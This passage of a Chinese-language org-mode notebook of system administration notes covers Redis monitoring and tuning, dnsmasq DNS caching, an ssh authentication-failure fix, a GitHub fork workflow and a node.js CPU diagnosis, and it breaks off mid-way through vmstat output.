   #+begin_src sh
     sudo mv /etc/collectd.conf.pacsave /etc/collectd.conf
   #+end_src

** 启用 collectd 插件

    修改 collectd 配置文件 =/etc/collectd.conf= 
    #+begin_example
      LoadPlugin redis
          
      <Plugin redis>
        <Node "db">
           Host "127.0.0.1"
           Port "6379"
           Timeout 2000
        </Node>
      </Plugin>
    #+end_example
   
   重启 collectd 服务，现在可以在界面上看到 redis 的监控项了。

** 参考

   - [[http://arch.acgtyrant.com/2013/12/26/soul/][Arch Linux 的靈魂：PKGBUILD、AUR 和 ABS | Tyrant's Arch Linux]]

* TODO 诊断 redis 引起的 Web 服务响应慢问题                       :redis:web:

** 测量 Web 服务响应时间

   - 使用 shell 脚本测量

     #+begin_src sh
       while [ 1 ]; do (time -p curl -s "http://xxxxxxxx.com/..." -H 'Content-Type: application/json' -d '{...}') 2>&1 | tr '\n' ' ' | grep -E 'real [0-9.]+' | sed -u -r -e 's/.*real ([0-9.]+).*/\1/g'; sleep 1; done;
     #+end_src

   以上脚本每秒钟获取一次 http 请求的响应时间，可以快速确定服务响应慢问题的严重程度。

   同时在客户机和服务器上本机运行脚本，进行比对，排除网络因素。
   
   我们的服务测试时发现每过几十秒会有几秒钟响应变慢（2-5 秒），正常情况下响应时间低于 0.5 秒。

** 监控 Web 服务响应时间

   collectd 包含 curl 插件，可以收集 Web 服务的响应时间，方便后面验证优化效果。

   修改 =collectd.conf=
   #+begin_example
     LoadPlugin curl

     <Plugin curl>
      <Page "baidu">
        URL "http://www.baidu.com"
        MeasureResponseTime true
        Interval 10
      </Page>
     </Plugin>
   #+end_example
   以上配置以监控 baidu 的服务响应时间为例。

** 分析 Redis 性能指标

   =info= 命令输出
   #+begin_example
     # Server
     redis_version:2.8.6
     redis_git_sha1:00000000
     redis_git_dirty:0
     redis_build_id:3ee5d68cd3e96c92
     redis_mode:standalone
     os:Linux 2.6.32-220.23.1.el6.x86_64 x86_64
     arch_bits:64
     multiplexing_api:epoll
     gcc_version:4.4.6
     process_id:3722
     run_id:1f71c2e392c83fae71ded24b9ddeb0f1e2aae442
     tcp_port:6180
     uptime_in_seconds:10398636
     uptime_in_days:120
     hz:10
     lru_clock:1306258
     config_file:/usr/local/redis-2.8.6-6180/conf/redis.conf

     # Clients
     connected_clients:1119
     client_longest_output_list:1
     client_biggest_input_buf:0
     blocked_clients:0

     # Memory
     used_memory:1916417648
     used_memory_human:1.78G
     used_memory_rss:2236563456
     used_memory_peak:2480159192
     used_memory_peak_human:2.31G
     used_memory_lua:33792
     mem_fragmentation_ratio:1.17
     mem_allocator:jemalloc-3.2.0

     # Persistence
     loading:0
     rdb_changes_since_last_save:502382
     rdb_bgsave_in_progress:0
     rdb_last_save_time:1460097434
     rdb_last_bgsave_status:ok
     rdb_last_bgsave_time_sec:20
     rdb_current_bgsave_time_sec:-1
     aof_enabled:1
     aof_rewrite_in_progress:1
     aof_rewrite_scheduled:0
     aof_last_rewrite_time_sec:34
     aof_current_rewrite_time_sec:30
     aof_last_bgrewrite_status:ok
     aof_last_write_status:ok
     aof_current_size:2386033576
     aof_base_size:1110696513
     aof_pending_rewrite:0
     aof_buffer_length:42929
     aof_rewrite_buffer_length:135105200
     aof_pending_bio_fsync:0
     aof_delayed_fsync:0

     # Stats
     total_connections_received:896035
     total_commands_processed:256210286435
     instantaneous_ops_per_sec:37604
     rejected_connections:0
     sync_full:56827
     sync_partial_ok:606
     sync_partial_err:1443
     expired_keys:404136260
     evicted_keys:0
     keyspace_hits:172273397975
     keyspace_misses:710076744
     pubsub_channels:73
     pubsub_patterns:0
     latest_fork_usec:62938

     # Replication
     role:master
     connected_slaves:0
     master_repl_offset:33088479568562
     repl_backlog_active:1
     repl_backlog_size:536870912
     repl_backlog_first_byte_offset:33087942697651
     repl_backlog_histlen:536870912

     # CPU
     used_cpu_sys:8575038464.00
     used_cpu_user:14889546752.00
     used_cpu_sys_children:371191.22
     used_cpu_user_children:2255948.00

     # Keyspace
     db0:keys=206355,expires=0,avg_ttl=0
     db1:keys=207580,expires=0,avg_ttl=0
     db2:keys=207256,expires=0,avg_ttl=0
     db3:keys=207346,expires=0,avg_ttl=0
     db4:keys=207413,expires=0,avg_ttl=0
     db5:keys=207295,expires=0,avg_ttl=0
     db6:keys=206843,expires=0,avg_ttl=0
     db7:keys=206329,expires=0,avg_ttl=0
     db8:keys=207001,expires=0,avg_ttl=0
     db9:keys=207095,expires=0,avg_ttl=0
     db10:keys=2,expires=0,avg_ttl=0
     db12:keys=254337,expires=254317,avg_ttl=216758902
   #+end_example

   通过频繁执行 =info= 命令，发现 redis 存盘特别频繁（20多秒一次），aof_rewrite_in_progress 和 rdb_bgsave_in_progress 还会同时发生。

   发现 Web 服务响应时间过长后，立即采取以下措施减少 redis 存盘频率：
   
   - 增加同步数据到 slave 的缓冲区大小

     由于 redis 写频率太高，repl_backlog_size 设置过小，增量同步数据会失败，导致 master 进行 bgsave 并重新发送内存快照。

     修改 =redis.conf=
     #+begin_example
       repl-backlog-size 500mb
     #+end_example
    
   - 关闭 bgsave 持久化

     修改 =redis.conf=
     #+begin_example
       #save 900 1
       #save 300 10
       #save 60 10000
     #+end_example

   另外发现 db0 - db9 数据量异常，这 10 个 db 保存以下数据：

   - 25 万设备信息

     25 万条记录。

   - 设备序列号与设备ID的对应关系（1 对 1）

     25 万条记录。

   - 用户与设备的对应关系（1 对 n）

     不超过 25 万条记录。

   - 应用数据

     不超过 25*2 万条记录。

   理论上 db0 - db9 的数据记录数不会超过 1250000（250000 + 250000 + 250000 + 250000*2 ），而实际上却有 2070513 条记录，也就是有接近一半的脏数据。

   分析 db0 中的 key，结果发现是脏数据来自应用数据，由于应用数据 id 可能会变化，旧 id 对应的数据未清除导致脏记录产生，为这这些数据设置过期时间应该可以自动清理掉脏数据。

** 参考

   - [[http://redis.io/topics/latency][Redis latency problems troubleshooting – Redis]]

   - [[https://collectd.org/documentation/manpages/collectd.conf.5.shtml#global_options][collectd.conf(5) – collectd – The system statistics collection daemon]]

   - [[http://blog.kankanan.com/article/archlinux-7684-collectd-652f630176d163a7-redis.html][Archlinux 的 collectd 支持监控 redis | 看看俺 – KanKanAn.com]]

   - [[http://www.tuicool.com/articles/fQ3Izu][线上大数据量redis主从一例 - 推酷]]
     
   - [[https://blog.newrelic.com/2015/05/11/redis-performance-metrics/][Understanding Redis Performance: The 7 Metrics]]

* DONE 勿用 redis 的多库                                              :redis:
  CLOSED: [2016-04-09 Sat 15:02]

** 不要将 redis 和 mysql 混为一谈

   在接触 redis 之前，相信很多人都有 mysql 的使用经验。

   mysql 的实体分层由上至下依次是：

   - 实例（instance）

     mysqld 进程。

   - 库（database）


   - 表（table）


   - 记录（row）

  
   - 字段（field）


   redis 的实体分层由上至下依次是：

   - 实例（instance）

     redis 进程。
  
   - 库（database）

  
   - 键值（Key-Value）


   我们很容易将 mysql 与 redis 的实例（instance）和库（database）等同起来，然而却大错特错。

   其实
   
   - redis 的实例（instance） 等同于 mysql 的库（database）


   - redis 的库（database） 等同于 mysql 的表（table）


** redis 的多库是鸡肋

   redis 是无预定义结构的（schema-less）数据库，表（table ）的存在意义不大，
   它更多地是做为命名空间（name space），由于使用的是很不友好的数字命名（默认 0-15），
   redis 中的 库（database）形同鸡肋。

   以下为 redis 作者的观点，引用自 [[https://groups.google.com/d/msg/redis-db/vS5wX8X4Cjg/8ounBXitG4sJ][database names? - Google 网上论坛]]
   #+begin_quote
   I understand how this can be useful, but unfortunately I consider
   Redis multiple database errors my worst decision in Redis design at
   all... without any kind of real gain, it makes the internals a lot
   more complex. The reality is that databases don't scale well for a
   number of reason, like active expire of keys and VM. If the DB
   selection can be performed with a string I can see this feature being
   used as a scalable O(1) dictionary layer, that instead it is not.

   With DB numbers, with a default of a few DBs, we are communication
   better what this feature is and how can be used I think. I hope that
   at some point we can drop the multiple DBs support at all, but I think
   it is probably too late as there is a number of people relying on this
   feature for their work.
   #+end_quote

** 使用 redis 多库是妥协的结果

   有一种观点认为不同的应用（app）使用不同的库（database）可以从而避免键命名冲突。

   redis 对于不同的库（database）没有提供任何隔离机制，完全依赖于应用（app）部署时约定使用不同的库（database）。
   
   为什么不约定应用（app）使用的所有键都加上应用（app）前缀，或者每个应用（app）使用不同的 redis 实例（instance）呢？

   从开发人员的角度来说
   
   - 如果每个应用（app）使用不同的实例（instance），是最省事的，连接 redis 后，直接操作即可

     
   - 如果每个应用（app）使用不同的库（database），略微麻烦一点，连接 redis 后，先执行一下 =select= =db= ，redis 客户端库会提供支持


   - 如果每个应用（app）的键（key）都加上应用（app）前缀，会很麻烦，每一处访问 redis 的代码都要涉及

   
   从运维人员的角度来说
   
   - 如果每个应用（app）使用不同的实例（instance），是最麻烦的，维护压力剧增，每个实例（instance）背后还要有配套的启动、停止脚本，监控，主备实例等
     
     
   - 如果每个应用（app）使用不同的库（database），略微麻烦一点，分配并记录一下，告知开发人员使用指定的 redis 实例及库（database）
     
     
   - 如果每个应用（app）的键（key）都加上应用（app）前缀，是最省事的，可以灵活地为应用（app）安排使用实例（instance）或库（database）


   不同的应用（app）使用不同的库（database）这一方案被采用，很可能是开发人员与运维人员互相妥协的结果。

** redis 的多库扩容难

   redis 的数据量或者请求数过高，会导致 redis 不稳定，最终影响服务质量。

   这时候就要考虑 redis 扩容了，需要将其中一个库（database）迁到新的实例（instance）上，过程如下：

   - 停掉应用（app）

   
   - 将应用（app）的 redis 库（database）同步到新的 redis 实例（instance）上

     通过拷贝 =dump.rdb= 的方式同步（传输）数据，redis 实例（instance）上的所有库（database）数据都是混在一起的，
     其它应用（app）数据会增加数据同步（传输）时间及新 redis 实例（instance） 数据载入时间。

     如果通过工具在线将应用（app）的 redis 库（database）拷贝到运行中的新 redis 实例（instance）上，会很耗时，
     对本身负载就很高的 redis 添加更多压力，可能会影响其它应用（app）。

     新 redis 实例（instance）设置为旧 redis 实例（instance） 的 slave，同步完成后取消 Master-Slave 关系，
     这种方法相对更好一些。

   - 启动新的 redis 实例

     
   - 修改应用（app）配置指向新的 redis 实例


   - 启动应用（app）

     
   - 清除两个 redis 实例中的脏数据

     =select= =db= ，然后执行 =flushdb= 命令即可，这可能是使用多库最大的好处。

   
   应用（app）的停机时间（Down Time）肯定短不了。


   如果每个应用（app）使用不同的实例，需要将某个实例迁到新机器，则可以做到平滑扩容（迁移），过程如下：

   - 应用（app）使用 redis sentinel 方式访问 redis

    
   - 新机器部署 redis 新实例


   - 新实例设置为旧 redis 实例的 slave

   
   - 同步完成后进行 Master-Slave 换位
     
     
   - 应用（app）会自动切到新的 redis 实例


   - 旧的 redis 实例可以停掉


** 参考

   - [[http://stackoverflow.com/questions/16221563/whats-the-point-of-multiple-redis-databases][What's the Point of Multiple Redis Databases? - Stack Overflow]]
    

   - [[https://groups.google.com/d/msg/redis-db/vS5wX8X4Cjg/8ounBXitG4sJ][database names? - Google 网上论坛]]

   
   - [[http://redis.io/topics/partitioning][Partitioning: how to split data among multiple Redis instances. – Redis]]
     
   
   - [[http://oldblog.antirez.com/post/redis-presharding.html][Redis Presharding]]

* DONE redis 的关键度量要素                                           :redis:
  CLOSED: [2016-04-14 Thu 22:40]

** redis 进程的 CPU 占用率

   redis 采用单线程模型，只能利用一个核，监控一定要到进程级，对于一台 16 核机器，redis CPU 占用 100%，但是机器的 CPU 占用很可能不到 10%。

   redis 进程的 CPU 占用率过高的时候是很脆弱的，额外出现的负载就很可能导致整个服务不可用，而且难以恢复，需要为 redis 减负（优化、功能降级）或扩容（更好的机器、更多的机器）。

** 机器的内存使用率

   redis 持久化数据到磁盘时，会 fork 出一个子进程，子进程负责写盘。

   理想情况下，redis 父进程从 fork 返回到子进程完成写盘这段时间内，父进程未进行任何内存变更，由于 Copy-On-Write 机制的存在，子进程共享父进程的内存空间。

   然而真实情况往往是另一个极端，redis 做为随机读写的内存数据库，父进程会瞬间在所有内存页上进行写操作，需要多一倍的内存空间占用。

   存盘时物理内存不足导致动用交换空间（Swap），整个机器都会不稳定。

   所以跑 redis 的机器，空闲内存量至少要达到 redis 进程的内存占用量。

** fork 行为

   redis 在进行 bgsave 或者 aof-rewrite 时，写盘（阻塞式操作）由 fork 出的子进程执行，不影响主进程的响应时间。

   但是 fork 是由主进程调用的，在某些环境（如：虚拟机）下耗时会比较长，可能导致 redis 服务的响应时间变长。

   fork、bgsave 或 aof-rewrite 耗时以及频率需要监控并保留历史记录，当它们升高时，redis 服务将周期性地出现响应时间变长、吞吐量下降，是重要的预警信号。

** 参考

   - [[https://blog.newrelic.com/2015/05/11/redis-performance-metrics/][Understanding Redis Performance: The 7 Metrics]]
   
   - [[http://redis.io/topics/latency][Redis latency problems troubleshooting – Redis]]
   
   - [[http://blog.csdn.net//chenleixing/article/details/50530419][Redis上踩过的一些坑-美团]]

* DONE 使用 dnsmasq 进行 DNS 缓存注意事项                           :linux:dns:
  CLOSED: [2016-04-21 Thu 17:45]

  dnsmasq 不仅能做域名解析结果缓存，它本身就是 dns 服务器。

  修改 =dnsmasq.conf=
  #+begin_example +n -r
    listen-address=127.0.0.1    (ref:dnsmasq_listen_local)
    interface=lo                (ref:dnsmasq_interface_lo)
    bind-interfaces             (ref:dnsmasq_bind_interfaces)
    #dhcp-authoritative         (ref:dnsmasq_disable_authoritative)
    strict-order                (ref:dnsmasq_strict_order)
    no-negcache                 (ref:dnsmasq_no_negcache)
  #+end_example

  - 行 [[(dnsmasq_listen_local)]] [[(dnsmasq_interface_lo)]] [[(dnsmasq_bind_interfaces)]] [[(dnsmasq_disable_authoritative)]]
    
    只对本机提供服务，避免网络内的其它机器访问。


  - 行 [[(dnsmasq_strict_order)]]

    dnsmasq 并行向所有上游域名服务器请求解析域名，采用最快返回的解析结果。
    
    由于上游服务器列表是从网络环境中获取，可能获取到有问题的域名服务器（立即返回无法解析域名），导致域名解析总是失败，如下所示：
    #+begin_example
      $ nslookup www.baidu.com


      Server:    127.0.0.1
      Address 1: 127.0.0.1 localhost.lan

      nslookup: can't resolve 'www.baidu.com': Name or service not known
    #+end_example

    =strict-order= 配置项指定按域名服务器在配置文件（由 =resolv-file= 配置项指定，默认为 =/etc/resolv.conf= ）中出现的顺序依次解析，
    第一个域名服务器配置正确就能够避免这个问题。


  - 行 [[(dnsmasq_no_negcache)]]

    当上游域名服务器返回找不到域名（no such domain）时，不缓存结果。
* DONE 使用 dnsmasq 缓存域名解析结果加快上网速度                    :linux:dns:
  CLOSED: [2016-04-21 Thu 19:44]

  - 安装 dnsmasq
    
    #+begin_src sh
      yaourt -S dnsmasq
    #+end_src

  - 配置 NetworkManager

    NetworkManager 包含 dnsmasq 插件，可以很方便地支持 dns 缓存。

    修改 =/etc/NetworkManager/NetworkManager.conf=
    #+begin_example
      dns=dnsmasq
    #+end_example

    参考 [[https://wiki.archlinux.org/index.php/dnsmasq#NetworkManager][dnsmasq - ArchWiki]]
    
  - 配置 dnsmasq
    
    NetworkManager 将 dnsmasq 的配置存放在其它位置。
    
    =/etc/NetworkManager/dnsmasq.d/dnsmasq.conf=
    #+begin_example
      listen-address=127.0.0.1
      bind-interfaces
      dhcp-authoritative
      no-negcache
      strict-order    
    #+end_example

    参考 《[[http://blog.kankanan.com/article/4f7f7528-dnsmasq-8fdb884c-dns-7f135b586ce8610f4e8b9879.html][使用 dnsmasq 进行 DNS 缓存注意事项]]》

  - 生效配置

    重启 NetworkManager 正式生效配置
    #+begin_src sh
      sudo systemctl restart NetworkManager
    #+end_src

    dnsmasq 不要通过 systemd 以服务方式启动，它会由 NetworkManager 启动
    #+begin_example
      $ COLUMNS=400 ps wax | grep dnsmasq
       6072 ?        S      0:00 /usr/bin/dnsmasq --no-resolv --keep-in-foreground --no-hosts --bind-interfaces --pid-file=/var/run/NetworkManager/dnsmasq.pid --listen-address=127.0.0.1 --conf-file=/var/run/NetworkManager/dnsmasq.conf --cache-size=400 --proxy-dnssec --conf-dir=/etc/NetworkManager/dnsmasq.d
    #+end_example

    上游域名服务器在 =/var/run/NetworkManager/dnsmasq.conf= 中指定，通常由 dhcp 服务分配。

    添加其它域名服务器，在 =/etc/NetworkManager/dnsmasq.d/dnsmasq.conf= 中添加以下配置：
    #+begin_example
      server=114.114.114.114
    #+end_example

    输出日志调试 dnsmasq ，在 =/etc/NetworkManager/dnsmasq.d/dnsmasq.conf= 中添加以下配置：
    #+begin_example
      log-facility=/var/log/dnsmasq.log
      log-queries
    #+end_example

    重启 NetworkManager 生效。

  - 看看效果
    
    多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是 DNS 缓存在起作用。

    #+begin_src sh
      nslookup www.baidu.com
    #+end_src

  - 与 pdnsd 比较

    之前写过一篇《 [[http://blog.kankanan.com/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html][使用Pdnsd缓存域名解析结果加快上网速度]] 》，本篇改用 dnsmasq 实现，可以发现 dnsmasq 和 NetworkManager 集成度很高，即插即用，
    而 pdnsd 则要手动做很多设置，而且很难实现自动使用 dhcp 分配的域名服务器做为上游域名服务器。
* DONE 解决 ssh 登录总是提示认证失败次数过多的问题           :linux:security:
  CLOSED: [2016-04-24 Sun 17:08]

  服务器需要 vpn 才能进行 ssh 访问，但是周末在家突然 ssh 登录不上了，如下所示：
  #+begin_example
    $ ssh tangxinfa@xxxx.xxxxxx.xxx
    Received disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa
    Connection to xxxx.xxxxxx.xxx closed by remote host.
    Connection to xxxx.xxxxxx.xxx closed.
  #+end_example

  找运维人员咨询，说有可能是 openvpn 运行后设置的路由有问题，ssh 登录没有走 vpn ，建议重建 vpn 连接或重启机器。
  但是重启机器后还是一样，在 windows 下使用 openvpn ，通过 pietty 却可以正常 ssh 登录上服务器。

  网上搜索了一下，找到一个有关的帖子
  #+begin_quote
  This is usually caused by inadvertently offering multiple ssh keys to the server. The server will reject any key after too many keys have been offered.

  You can see this for yourself by adding the -v flag to your ssh command to get verbose output. You will see that a bunch of keys are offered, until the server rejects the connection saying: "Too many authentication failures for [user]". Without verbose mode, you will only see the ambiguous message "Connection reset by peer".

  To prevent irrelevant keys from being offered, you have to explicitly specify this in every host entry in the ~/.ssh/config file by adding IdentitiesOnly like so:

  Host www.somehost.com
      IdentityFile ~/.ssh/key_for_somehost_rsa
      IdentitiesOnly yes
      Port 22
  #+end_quote
  引用自《[[http://superuser.com/questions/187779/too-many-authentication-failures-for-username][ssh - Too many authentication failures for *username* - Super User]]》

  也就是说，ssh 登录时会使用系统上的公匙依次进行认证，如果公私匙对数量超过服务器登录失败次数限制，就会出现上面提到的问题。
  
  为了登录 github 及内部的 gitlab，我创建了不同的 rsa 公私匙对，算上系统默认的公私匙对，达到三对
  #+begin_example
    $ tree ~/.ssh
    /home/tangxinfa/.ssh
    ├── github_id_rsa
    ├── github_id_rsa.pub
    ├── id_rsa
    ├── id_rsa.pub
    ├── known_hosts
    ├── gitlab_id_rsa
    └── gitlab_id_rsa.pub

    0 directories, 7 files
  #+end_example

  当我们使用 ssh 登录服务器时，默认情况下会尝试使用公钥依次进行身份验证，如果还是失败则会使用密码进行登录
  #+begin_example
    $ ssh -v tangxinfa@xxxx.xxxxxx.xxx
    ...
    debug1: Authentications that can continue: publickey,password
    debug1: Next authentication method: publickey
    debug1: Offering RSA public key: /home/tangxinfa/.ssh/id_rsa
    debug1: Authentications that can continue: publickey,password
    debug1: Offering RSA public key: github
    debug1: Authentications that can continue: publickey,password
    debug1: Offering RSA public key: gitlab
    Received disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa
    debug1: Authentication succeeded (publickey).
    Authenticated to xxxx.xxxxxx.xxx ([xxx.xxx.xxx.xxx]:22).
    debug1: channel 0: new [client-session]
    debug1: Requesting no-more-sessions@openssh.com
    debug1: Entering interactive session.
    debug1: pledge: network
    debug1: channel 0: free: client-session, nchannels 1
    Connection to xxxx.xxxxxx.xxx closed by remote host.
    Connection to xxxx.xxxxxx.xxx closed.
    Transferred: sent 3328, received 2776 bytes, in 0.1 seconds
    Bytes per second: sent 59495.7, received 49627.4
    debug1: Exit status -1
  #+end_example

  知道了问题的原因，解决方法就很多了，如：

  - 调整 ssh 服务配置，调高失败次数限制
    
  - 调整 ssh 客户端配置，不使用公钥认证

    可以在命令行选项中指定
    #+begin_src sh
      ssh -o PreferredAuthentications=password tangxinfa@xxxx.xxxxxx.xxx
    #+end_src

    也可以配置文件中指定
    =~/.ssh/config=
    #+begin_example
      Host xxxx xxxx.xxxxxx.xxx
           HostName xxxx.xxxxxx.xxx
           User tangxinfa
           PreferredAuthentications password
    #+end_example
* TODO 参与 github 开源项目的正确姿势                                   :git:

** 使用开源项目


** 发现开源项目的问题


** 查看开源项目的 Issues 及 Pull requests

   如果这个问题已经有人在着手解决了，估计我们只能够发表一下意见，如果没有则进入下一步。
    
** Fork 开源项目

   在 github 的开源项目页面上点击 Fork 即可。


   下面假设：
    
   - 开源项目仓库地址 :: https://github.com/nodejs/node.git
    
   - 我的用户名 :: tangxinfa


   我的仓库地址为 https://github.com/tangxinfa/node.git

** 拉取我的仓库代码

   #+begin_example
     git clone https://github.com/tangxinfa/node.git
   #+end_example

** 配置为 rebase 方式

   参考 [[http://blog.kankanan.com/article/git-591a4eba534f4f5cff1a7ef462a45e7251c0768463d04ea46811.html][git多人协作：维护干净的提交树 | 看看俺 – KanKanAn.com]]

** 设置上游分支

   #+begin_example
     git remote add upstream https://github.com/nodejs/node.git
   #+end_example

** 创建特性分支

   主干分支（master）确保不做任何提交，与上游分支（upstream）保持同步，所有开发工作都在特性分支上进行。

   #+begin_src sh
     git checkout -b my-feature-branch -t origin/master
   #+end_src

** 在特性分支上进行开发

** 多个特性分支间的合并

   可以创建多个分支，并在分支间进行合并

   #+begin_src sh
     git checkout my-feature-branch1
     git merge my-feature-branch2
   #+end_src

** 从特性分支创建 Pull requests 提交到上游分支

   在个人 github 项目主页上切到特性分支 =my-feature-branch= ，点击 =New pull request=

** 上游分支接受了 Pull requests


** 将我的主干分支与上游分支同步

   #+begin_src sh
     git fetch upstream
     git checkout master
     git rebase upstream/master
     git push origin master
   #+end_src

*** 如果忘记创建特性分支，是在主干分支上进行的开发，最后怎么跟上游分支保持同步

    上游接受 Pull requests 时，往往会略做改动，正常的同步通常会失败
    #+begin_example
      $ git rebase upstream/master
      ...
      error: Failed to merge in the changes.
      ...
    #+end_example

    可以强制跟上游分支同步
    #+begin_example
      git fetch upstream
      git checkout master
      git reset --hard upstream/master
      git push origin master --force
    #+end_example

    参考

    - [[http://stackoverflow.com/questions/9646167/clean-up-a-fork-and-restart-it-from-the-upstream][git - Clean up a fork and restart it from the upstream - Stack Overflow]]
    
** 特性分支已经完成使命可以删掉

** 参考

   - [[https://github.com/nodejs/node/blob/master/CONTRIBUTING.md][Contributing to Node.js]]

* DONE 诊断 node.js 应用 CPU 占用过高的问题                      :node:linux:
  CLOSED: [2016-05-12 Thu 17:25]

  node.js 应用使用 pm2 进行管理，采用 cluster 模式，每台服务器运行 16 个 node.js 实例。

  应用的开销主要在网络上：

  平均每个 node.js 实例要维持来自嵌入式设备的约 3K TLS 长连接，平均每秒会有 30 个来自客户端的 HTTP 短连接。

  TLS 长连接上最多 45 秒会有一次心跳（发送 80 多字节，接收 400 多字节）。

** 系统信息

*** =CPU=

    - 逻辑 CPU 数：24 

      #+begin_example
        # cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c 
             24  Intel(R) Xeon(R) CPU E5-2620 v2 @ 2.10GHz
      #+end_example

    - 物理 CPU 数：2

      #+begin_example
        # cat /proc/cpuinfo | grep 'physical id' | sort | uniq -c
             12 physical id : 0
             12 physical id : 1
      #+end_example

    - 每个物理 CPU 的核数：6

      #+begin_example
        # cat /proc/cpuinfo | grep "cpu cores" | uniq | awk -F: '{print $2}'
         6
      #+end_example

    - 每个核超线程数：2

      两个逻辑 CPU 具有相同的 =core id= 则超线程是打开的。
      
      #+begin_example
        # cat /proc/cpuinfo | grep -E "physical id|core id" | sed -e ':a;N;$!ba;s/\ncore id\s*/       core id /g' | sort | uniq -c
              2 physical id : 0       core id : 0
              2 physical id : 0       core id : 1
              2 physical id : 0       core id : 2
              2 physical id : 0       core id : 3
              2 physical id : 0       core id : 4
              2 physical id : 0       core id : 5
              2 physical id : 1       core id : 0
              2 physical id : 1       core id : 1
              2 physical id : 1       core id : 2
              2 physical id : 1       core id : 3
              2 physical id : 1       core id : 4
              2 physical id : 1       core id : 5
      #+end_example

    参考：[[http://blog.sina.com.cn/s/blog_4a6151550100iowl.html][Linux CPU数量判断，通过/proc/cpuinfo._一沙一花_新浪博客]]

*** =内存=

    =64G= 内存， =37.8G= 空闲内存

    #+begin_example
      # cat /proc/meminfo
      MemTotal:       65916740 kB
      MemFree:        39663756 kB
      Buffers:          595424 kB
      Cached:          7627876 kB
      SwapCached:            0 kB
      Active:         17368112 kB
      Inactive:        6936088 kB
      Active(anon):   16002524 kB
      Inactive(anon):    80820 kB
      Active(file):    1365588 kB
      Inactive(file):  6855268 kB
      Unevictable:          32 kB
      Mlocked:              32 kB
      SwapTotal:      20971512 kB
      SwapFree:       20971512 kB
      Dirty:              1896 kB
      Writeback:             0 kB
      AnonPages:      16081968 kB
      Mapped:            19596 kB
      Shmem:              1624 kB
      Slab:            1087320 kB
      SReclaimable:     756368 kB
      SUnreclaim:       330952 kB
      KernelStack:        5272 kB
      PageTables:        64280 kB
      NFS_Unstable:          0 kB
      Bounce:                0 kB
      WritebackTmp:          0 kB
      CommitLimit:    53929880 kB
      Committed_AS:   17348828 kB
      VmallocTotal:   34359738367 kB
      VmallocUsed:      436016 kB
      VmallocChunk:   34324325464 kB
      HardwareCorrupted:     0 kB
      AnonHugePages:   2525184 kB
      HugePages_Total:       0
      HugePages_Free:        0
      HugePages_Rsvd:        0
      HugePages_Surp:        0
      Hugepagesize:       2048 kB
      DirectMap4k:        4096 kB
      DirectMap2M:     2076672 kB
      DirectMap1G:    65011712 kB
    #+end_example

** 系统状态

   =top=
   #+begin_example
     # top -n 1
     top - 13:05:48 up 144 days, 20:52,  2 users,  load average: 2.86, 2.46, 2.78
     Tasks: 476 total,  19 running, 457 sleeping,   0 stopped,   0 zombie
     Cpu(s): 22.7%us,  1.2%sy,  0.0%ni, 75.0%id,  0.0%wa,  0.0%hi,  1.1%si,  0.0%st
     Mem:  65916740k total, 26237540k used, 39679200k free,   595424k buffers
     Swap: 20971512k total,        0k used, 20971512k free,  7614508k cached

        PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND          
     191463 nobody    20   0 1884m 981m 9.8m R 83.3  1.5  12337:09 node /usr/local  
     192063 nobody    20   0 1905m 1.0g 9.8m R 73.6  1.6  12320:35 node /usr/local  
     194450 nobody    20   0 1842m 937m 9.8m R 62.0  1.5  12060:56 node /usr/local  
     191515 nobody    20   0 1911m 1.0g 9.8m R 60.1  1.6  12308:13 node /usr/local  
     190881 nobody    20   0 1862m 957m 9.8m R 52.3  1.5  12257:46 node /usr/local  
     195178 nobody    20   0 1795m 891m 9.8m R 52.3  1.4  11647:01 node /usr/local  
     193068 nobody    20   0 1873m 970m 9.8m R 50.4  1.5  12144:28 node /usr/local  
     194523 nobody    20   0 1805m 902m 9.8m R 50.4  1.4  11948:57 node /usr/local  
     190790 nobody    20   0 1857m 951m 9.8m R 48.4  1.5  12174:59 node /usr/local  
     191609 nobody    20   0 1847m 945m 9.8m R 48.4  1.5  12203:47 node /usr/local  
     192946 nobody    20   0 1898m 993m 9.8m R 48.4  1.5  12224:41 node /usr/local  
     193029 nobody    20   0 1827m 924m 9.8m R 48.4  1.4  12291:51 node /usr/local  
     195276 nobody    20   0 1786m 883m 9.8m R 48.4  1.4  11659:07 node /usr/local  
     196001 nobody    20   0 1885m 981m 9.8m R 48.4  1.5  11428:22 node /usr/local  
     193725 nobody    20   0 1884m 978m 9.8m R 46.5  1.5  12336:34 node /usr/local  
      80300 root      20   0  611m 454m 1152 R 44.6  0.7  26523:40 redis-server     
     195944 nobody    20   0 1815m 912m 9.8m R 44.6  1.4  11353:21 node /usr/local  
   #+end_example

   =vmstat=
   #+begin_example
     # vmstat 1
     |----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|
     |  r | b | swpd |     free |   buff |   cache | si | so | bi |    bo |     in |    cs | us | sy | id | wa | st |
     |----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|
     | 17 | 0 |    0 | 39769884 | 595424 | 7523076 |  0 |  0 |  0 |    71 |      0 |     0 | 23 |  2 | 75 |  0 |  0 |
     |  9 | 0 |    0 | 39763800 | 595424 | 7528200 |  0 |  0 |  0 |  5188 | 108347 | 21186 | 53 |  5 | 41 |  0 |  0 |
     | 17 | 0 |    0 | 39758360 | 595424 | 7534084 |  0 |  0 |  0 |  5272 | 106375 | 24054 | 49 |  5 | 45 |  0 |  0 |
     | 15 | 0 |    0 | 39753912 | 595424 | 7538236 |  0 |  0 |  0 |  5252 | 107669 | 23522 | 50 |  5 | 44 |  0 |  0 |
     | 12 | 0 |    0 | 39747588 | 595424 | 7544612 |  0 |  0 |  0 |  5304 | 108452 | 24290 | 49 |  5 | 46 |  0 |  0 |
     | 15 | 0 |    0 | 39742744 | 595424 | 7548076 |  0 |  0 |  0 |  5200 | 106615 | 25614 | 47 |  5 | 48 |  0 |  0 |
     | 13 | 0 |    0 | 39738224 | 595424 | 7552712 |  0 |  0 |  0 |  5092 | 101642 | 25482 | 44 |  5 | 51 |  0 |  0 |
     |  9 | 0 |    0 | 39734116 | 595424 | 7559024 |  0 |  0 |  0 |  5156 |  98440 | 25393 | 42 |  5 | 53 |  0 |  0 |
